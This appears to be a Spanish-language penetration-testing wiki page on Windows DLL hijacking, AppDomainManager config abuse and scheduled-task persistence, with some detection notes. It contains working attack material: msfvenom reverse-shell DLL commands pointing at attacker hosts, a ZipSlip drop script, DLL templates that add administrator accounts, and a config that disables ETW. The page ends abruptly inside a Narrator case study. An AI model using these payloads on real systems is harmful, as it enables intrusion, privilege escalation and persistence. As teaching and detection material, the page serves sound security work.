# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking consiste en manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término abarca varias tácticas, como **DLL Spoofing, Injection y Side-Loading**. Se utiliza principalmente para ejecutar código y lograr persistencia y, con menor frecuencia, para escalar privilegios. Aunque aquí nos centramos en la escalada, el método de hijacking es el mismo para todos estos objetivos.

### Técnicas comunes

Se emplean varios métodos para realizar DLL hijacking; su eficacia depende de la estrategia de carga de DLL de la aplicación:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Sustituir una DLL legítima por una maliciosa, opcionalmente mediante DLL Proxying para conservar la funcionalidad de la DLL original.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda anterior a la de la DLL legítima y aprovechar el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que una aplicación la cargue creyendo que se trata de una DLL requerida que no existe.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una contraparte maliciosa en el directorio WinSxS, un método que suele asociarse con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto a la aplicación copiada, de forma similar a las técnicas de Binary Proxy Execution.

Una aplicación también puede implementar su **propio cargador de DLL**. Un proceso con privilegios puede enumerar un directorio secundario, como `Libraries` o `Plugins`, y pasar una DLL seleccionada a un helper, independientemente del orden normal de búsqueda de DLL de Windows. Si otra cuenta puede crear archivos en ese directorio concreto, considéralo un indicio que se debe investigar: confirma la identidad del proceso, la ACL efectiva del directorio, la regla de selección de archivos y que se pueda alcanzar una operación de carga. Que se pueda escribir en un directorio junto a un ejecutable no demuestra que el proceso cargue DLL desde allí.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + ensamblado del atacante)

El sideloading clásico de DLL no es la única forma de hacer que un proceso de **.NET Framework** de confianza cargue código del atacante. Si el ejecutable objetivo es una aplicación **administrada**, el CLR también consulta un **archivo de configuración de la aplicación** con el nombre del ejecutable (por ejemplo, `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si la configuración apunta a un ensamblado controlado por el atacante y ubicado junto al EXE, el CLR lo carga **antes de la ruta de ejecución normal de la aplicación** y se ejecuta dentro del proceso de confianza.<sup>[[24]](#references)</sup>

Según el esquema de configuración de .NET Framework de Microsoft, deben estar presentes tanto `<appDomainManagerAssembly>` como `<appDomainManagerType>` para que se use el administrador personalizado.<sup>[[16]](#references)[[17]](#references)</sup>

Configuración mínima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestor mínimo:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Notas prácticas:
- Estas técnicas son **específicas de .NET Framework**. Dependen del análisis de configuración del CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **EXE administrado**. Comprobación rápida: `sigcheck -m target.exe`, `corflags target.exe` o busca el **CLR Runtime Header** en los metadatos PE.
- El nombre del archivo de configuración debe coincidir exactamente con el nombre del ejecutable (`<binary>.config`) y suele estar **junto al EXE**.
- Esto resulta útil con **binarios firmados de Microsoft o de proveedores** porque el EXE de confianza permanece intacto mientras el ensamblado administrado malicioso se ejecuta dentro del proceso.
- Si ya tienes un directorio de instalación o actualización con permisos de escritura, puedes usar el secuestro de AppDomainManager como **primera etapa** y después recurrir al DLL sideloading clásico o a la carga reflectiva en etapas posteriores.

### AppDomainManager como downloader y bootstrap para una tarea programada

Un patrón práctico de intrusión consiste en combinar el EXE administrado de confianza con un `*.config` malicioso y una DLL maliciosa de AppDomainManager que actúa únicamente como un **pequeño bootstrapper**:<sup>[[25]](#references)</sup>

1. El usuario inicia un instalador o actualizador firmado de .NET desde una ubicación verosímil, como `%USERPROFILE%\Downloads`.
2. El archivo de configuración contiguo hace que el CLR cargue el ensamblado del atacante **antes de que empiece la lógica legítima de la aplicación**.
3. El administrador malicioso realiza un **control por ruta** (por ejemplo, solo continúa si el EXE host se está ejecutando desde `Downloads` y solo permite que la segunda etapa se ejecute desde `%LOCALAPPDATA%`).
4. Si la comprobación se supera, descarga la carga útil real en una ruta donde el usuario tenga permisos de escritura, como `%LOCALAPPDATA%\PerfWatson2.exe`, e instala persistencia mediante una tarea programada.

Por qué importa esta variante:
- El EXE host firmado permanece intacto, por lo que un análisis inicial que solo calcule el hash del binario principal podría no detectar el compromiso.
- El **anti-análisis basado en rutas** es habitual: mover el trío ZIP/EXE/DLL al Escritorio, a Temp o a una ruta del sandbox puede romper deliberadamente la cadena.
- La DLL de AppDomainManager de primera etapa puede ser pequeña y poco ruidosa mientras la implantación real se descarga más adelante.

Ejemplo mínimo de persistencia que suele verse con este patrón:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notas:
- ` /rl highest` significa **el nivel más alto disponible** para ese usuario/sesión; por sí solo no garantiza una escalada a SYSTEM.
- Esta técnica suele clasificarse mejor como **ejecución/persistencia mediante abuso de configuración de .NET** que como un secuestro clásico del orden de búsqueda por DLL faltante, aunque los operadores suelen combinar ambas.

Indicadores para la detección:
- Ejecutables de .NET firmados que se inician desde **rutas de extracción de ZIP**, `Downloads`, `%TEMP%` u otras carpetas donde el usuario puede escribir, junto con un archivo `<exe>.config` **en la misma carpeta**.
- Nuevas tareas programadas cuya acción apunta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` y cuyos nombres imitan los actualizadores de navegadores o proveedores.
- Procesos bootstrap administrados de corta duración que descargan inmediatamente otro EXE y luego inician `schtasks.exe`.
- Muestras que salen antes de tiempo si la ruta del ejecutable no coincide con un directorio esperado del perfil del usuario.

### Secuestrar una tarea programada existente para volver a iniciar la cadena de sideload

Para lograr persistencia, no busques únicamente la **creación de una tarea nueva**. Algunos grupos de intrusión esperan a que un instalador legítimo cree una **tarea de actualización normal** y luego **reescriben la acción de la tarea** para que el nombre, el autor y el desencadenador existentes sigan pareciendo familiares a los defensores.

Flujo de trabajo reutilizable:
1. Instala o ejecuta el software legítimo e identifica la tarea que crea normalmente.
2. Exporta el XML de la tarea y anota los valores actuales de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Reemplaza solo la acción para que la tarea inicie tu **EXE anfitrión confiable** desde un directorio de preparación donde el usuario pueda escribir; este luego carga lateralmente la carga útil real o la carga mediante AppDomain.
4. Vuelve a registrar el mismo nombre de tarea en lugar de crear un artefacto de persistencia nuevo y evidente.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Por qué es más sigiloso:
- El nombre de la tarea todavía puede parecer legítimo (por ejemplo, un actualizador de un proveedor).
- El **servicio Programador de tareas** la inicia, así que la validación del proceso padre/ancestro suele ver la cadena de programación esperada en lugar de `explorer.exe`.
- Los equipos de DFIR que solo buscan **nombres de tareas nuevos** pueden pasar por alto una tarea cuyo registro ya existía, pero cuya acción ahora apunta a `%LOCALAPPDATA%`, `%APPDATA%` u otra ruta controlada por el atacante.

Puntos de búsqueda rápidos:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compara el XML de `C:\Windows\System32\Tasks\*` y los metadatos de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una línea base.
- Genera una alerta cuando una **tarea de actualización que parece ser de un proveedor** se ejecute desde **directorios donde el usuario puede escribir** o inicie un EXE de .NET con un archivo `*.config` en el mismo directorio.

> [!TIP]
> Para ver una cadena paso a paso que combina la preparación de HTML, configuraciones AES-CTR e implantes de .NET con DLL sideloading, consulta el siguiente flujo de trabajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrar DLL faltantes

La forma más común de encontrar DLL faltantes en un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de Sysinternals y **configurar** los **siguientes 2 filtros**:

![Técnicas comunes - Encontrar DLL faltantes: La forma más común de encontrar DLL faltantes en un sistema es ejecutar procmon de Sysinternals y configurar los siguientes 2 filtros](<../../../images/image (961).png>)

![Técnicas comunes - Encontrar DLL faltantes: La forma más común de encontrar DLL faltantes en un sistema es ejecutar procmon de Sysinternals y configurar los siguientes 2 filtros](<../../../images/image (230).png>)

y mostrar solo la **actividad del sistema de archivos**:

![Técnicas comunes - Encontrar DLL faltantes: y mostrar solo la actividad del sistema de archivos](<../../../images/image (153).png>)

Si buscas **DLL faltantes en general**, **déjalo** ejecutándose durante algunos **segundos**.\
Si buscas una **DLL faltante dentro de un ejecutable específico**, configura otro filtro, como **"Process Name" "contains" `<exec name>`**, ejecútalo y detén la captura de eventos.<sup>[[9]](#references)</sup>

## Explotar DLL faltantes

Para escalar privilegios, busca una **DLL que un proceso con privilegios intente cargar** desde una ubicación en la que puedas escribir. Esto puede ocurrir cuando controlas un directorio que se busca antes que el directorio que contiene la DLL legítima, o cuando la DLL solicitada no existe y puedes escribir en uno de los directorios de búsqueda.

### Orden de búsqueda de DLL

**En la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente las DLL.**

Las **aplicaciones de Windows** buscan DLL siguiendo un conjunto de **rutas de búsqueda predefinidas** y respetando una secuencia determinada. El problema del DLL hijacking surge cuando se coloca estratégicamente una DLL maliciosa en uno de estos directorios, de modo que se cargue antes que la DLL auténtica. Una forma de evitarlo es asegurarse de que la aplicación use rutas absolutas al referirse a las DLL que necesita.

A continuación puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits**:

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No hay ninguna función que obtenga la ruta de este directorio, pero se busca en él. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
   1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios indicados en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta específica de la aplicación indicada por la clave de registro **App Paths**. La clave **App Paths** no se usa al calcular la ruta de búsqueda de DLL.

Este es el orden de búsqueda **predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual pasa al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (está habilitado de forma predeterminada).

Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Por último, una DLL puede cargarse mediante una ruta absoluta en lugar de por su nombre. En ese caso, Windows busca la DLL únicamente en esa ruta; las dependencias solicitadas por nombre siguen el orden de búsqueda correspondiente.

Hay otras formas de modificar el orden de búsqueda, pero no las explicaré aquí.

### Encadenar una escritura arbitraria de archivos con un hijack de DLL faltante

**Técnica relacionada:** [cambio de mount point controlado por oplock frente a una remediación con privilegios](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Usa filtros de **ProcMon** (`Process Name` = EXE objetivo, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) para recopilar los nombres de las DLL que el proceso intenta encontrar, pero no encuentra.<sup>[[14]](#references)</sup>
2. Si el binario se ejecuta mediante una **tarea programada o un servicio**, dejar una DLL con uno de esos nombres en el **directorio de la aplicación** (entrada n.º 1 del orden de búsqueda) hará que se cargue en la siguiente ejecución. En un caso con un scanner de .NET, el proceso buscaba `hostfxr.dll` en `C:\samples\app\` antes de cargar la copia real desde `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL de payload (p. ej., reverse shell) con cualquier exportación: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si tu primitiva es una **escritura arbitraria de tipo ZipSlip**, crea un ZIP cuya entrada escape del directorio de extracción para que la DLL acabe en la carpeta de la aplicación:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Entrega el archivo en la bandeja de entrada/compartición supervisada; cuando la tarea programada vuelva a iniciar el proceso, este cargará la DLL maliciosa y ejecutará tu código como la cuenta de servicio.

### Forzar sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado consiste en establecer el campo DllPath de RTL_USER_PROCESS_PARAMETERS al crear el proceso mediante las API nativas de ntdll. Si proporcionas aquí un directorio controlado por el atacante, puedes hacer que un proceso objetivo que resuelva una DLL importada por nombre (sin una ruta absoluta y sin usar los flags de carga segura) cargue una DLL maliciosa desde ese directorio.

Idea clave
- Crea los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde está tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará el DllPath proporcionado durante la resolución, lo que permitirá un sideloading fiable incluso si la DLL maliciosa no está en el mismo directorio que el EXE objetivo.

Notas y limitaciones
- Esto afecta al proceso hijo que se está creando; es distinto de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar una DLL por nombre o cargarla con LoadLibrary (sin una ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y las rutas absolutas codificadas no se pueden hijackear. Los exports reenviados y SxS pueden alterar la precedencia.

Ejemplo mínimo en C (ntdll, cadenas wide, gestión de errores simplificada):

<details>
<summary>Ejemplo completo en C: forzar DLL sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (que exporte las funciones requeridas o haga proxy a la DLL real) en tu directorio DllPath.
- Inicia un binario firmado que se sepa que busca xmllite.dll por nombre mediante la técnica anterior. El loader resuelve la importación usando el DllPath proporcionado y carga lateralmente tu DLL.

Se ha observado esta técnica en operaciones reales para impulsar cadenas de sideloading de varias etapas: un launcher inicial deja una DLL auxiliar, que luego inicia un binario firmado por Microsoft y susceptible de hijacking, con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.<sup>[[6]](#references)</sup>


### Hijacking de AppDomainManager de .NET mediante `.exe.config`

Para objetivos de **.NET Framework**, se puede hacer sideloading **antes de `Main()`** sin modificar la memoria, abusando del archivo **`.exe.config`** adyacente a la aplicación. En lugar de depender únicamente del orden de búsqueda de DLL de Win32, el atacante coloca un EXE legítimo de .NET junto a un archivo de configuración malicioso y uno o más assemblies controlados por el atacante.

Cómo funciona la cadena:<sup>[[15]](#references)[[22]](#references)</sup>
1. Se inicia el EXE anfitrión y el **CLR lee `<exe>.config`**.
2. La configuración establece **`<appDomainManagerAssembly>`** y **`<appDomainManagerType>`** para que el runtime instancie un `AppDomainManager` controlado por el atacante.
3. El manager malicioso obtiene **ejecución antes de `Main()`** dentro del proceso anfitrión de confianza.
4. La misma configuración puede obligar al CLR a resolver primero los assemblies locales (por ejemplo, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) y puede debilitar la validación y la telemetría del runtime sin parcheo inline.

Patrón de tipo campaña (el anidamiento exacto puede variar según la directiva o la versión del CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Por qué resulta útil:
- **`<probing privatePath="."/>`** mantiene la resolución de ensamblados en el directorio de la aplicación, convirtiendo la carpeta en una superficie predecible para el sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** trasladan la ejecución a código del atacante durante la inicialización del CLR, antes de que se ejecute la lógica legítima de la aplicación.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** puede permitir que una aplicación de confianza total cargue ensamblados sin firma o manipulados sin que se produzca un error de validación de strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita las redirecciones de publisher policy a ensamblados más recientes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hace que la selección del runtime sea más determinista.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** resulta especialmente interesante porque el **CLR deshabilita su propia visibilidad de ETW** desde la configuración, en lugar de que el implante aplique un parche en memoria a `EtwEventWrite`.

Patrón operativo observado en campañas recientes:
- Etapa 1: deposita `setup.exe`, `setup.exe.config` y ensamblados locales.
- Etapa 2: los copia a una carpeta verosímil de **actualización en AppData**, cambia el nombre del host a algo como `update.exe` y lo vuelve a iniciar mediante una **tarea programada**.
- Etapa 3: verifica el contexto de ejecución (por ejemplo, que el proceso principal esperado sea `svchost.exe` iniciado por el Programador de tareas) antes de cargar la DLL/exportación final del RAT.

Ideas para la búsqueda de amenazas:
- **Ejecutables .NET** firmados o aparentemente legítimos que se ejecutan junto a archivos **`.config`** sospechosos en ubicaciones donde los usuarios pueden escribir.
- Archivos `.config` que contengan **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Tareas programadas que vuelven a iniciar binarios de actualización renombrados desde **`%LOCALAPPDATA%`** o directorios específicos de la aplicación, como `\bin\update\`.
- Cadenas de procesos principales/secundarios en las que una tarea programada inicia un host .NET de confianza que inmediatamente carga ensamblados que no pertenecen al proveedor desde su propio directorio.

#### Excepciones al orden de búsqueda de DLL según la documentación de Windows

La documentación de Windows señala ciertas excepciones al orden de búsqueda estándar de DLL:

- Cuando se encuentra una **DLL cuyo nombre coincide con el de otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, comprueba si hay una redirección y un manifiesto antes de recurrir a la DLL que ya está en memoria. **En este escenario, el sistema no busca la DLL**.
- Si la DLL se reconoce como una **DLL conocida** para la versión actual de Windows, el sistema utiliza su versión de esa DLL conocida, junto con las DLL de las que depende, **sin realizar la búsqueda**. La clave del Registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas DLL conocidas.
- Si una **DLL tiene dependencias**, la búsqueda de esas DLL dependientes se realiza como si solo se hubieran indicado sus **nombres de módulo**, independientemente de si la DLL inicial se identificó mediante una ruta completa.

### Escalada de privilegios

**Requisitos**:

- Identificar un proceso que se ejecute o vaya a ejecutarse con **privilegios diferentes** (movimiento horizontal o lateral) y al que **le falte una DLL**.
- Asegurarse de tener **acceso de escritura** a cualquier **directorio** en el que se vaya a **buscar la DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio de la ruta del sistema.

Estos requisitos no suelen darse de forma predeterminada: los ejecutables privilegiados normalmente no tienen dependencias de DLL ausentes, y los usuarios estándar normalmente no pueden escribir en los directorios de la ruta de búsqueda del sistema. Aun así, los entornos mal configurados pueden presentar ambas condiciones.\
Si se cumplen los requisitos, consulta el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque su objetivo principal es eludir UAC, contiene PoC de DLL hijacking para versiones específicas de Windows que a menudo se pueden adaptar al directorio con permisos de escritura que hayas encontrado.

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** con:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Y **comprueba los permisos de todas las carpetas dentro de PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

También puedes comprobar las importaciones de un ejecutable y las exportaciones de una DLL con:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Para ver una guía completa sobre cómo **abusar de DLL Hijacking para escalar privilegios** con permisos de escritura en una **carpeta de System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en alguna carpeta dentro de system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las funciones de **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

Si encuentras un escenario explotable, una de las cosas más importantes para explotarlo correctamente sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que DLL Hijacking resulta útil para [**escalar del nivel Medium Integrity a High (omitiendo UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o de [**High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** en este estudio sobre DLL hijacking centrado en DLL hijacking para la ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos básicos de dll** que podrían servir como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creación y compilación de DLLs**

### **Proxy de DLL**

Básicamente, un **proxy de DLL** es una DLL capaz de **ejecutar tu código malicioso al cargarse**, pero también de **exponer** y **funcionar** como se **espera**, **reenviando todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que quieres convertir en proxy para **generar una dll con proxy**, o **indicar la DLL** y **generar una dll con proxy**.

### **Meterpreter**

**Obtener rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obtener un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Crear un usuario (x86, no vi una versión x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### El tuyo

En muchos casos, la DLL que compiles debe **exportar todas las funciones importadas por el proceso víctima**. Si falta una exportación necesaria, el binario no puede resolverla y el exploit falla.

<details>
<summary>Plantilla de DLL en C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa con punto de entrada de hilo</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Estudio de caso: secuestro de la DLL de localización de Narrator OneCore TTS (accesibilidad/ATs)

Windows Narrator.exe sigue buscando al iniciarse una DLL de localización predecible y específica del idioma, que puede secuestrarse para ejecutar código arbitrario y lograr persistencia.<sup>[[7]](#references)</sup>

Datos clave
- Ruta de búsqueda (compilaciones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
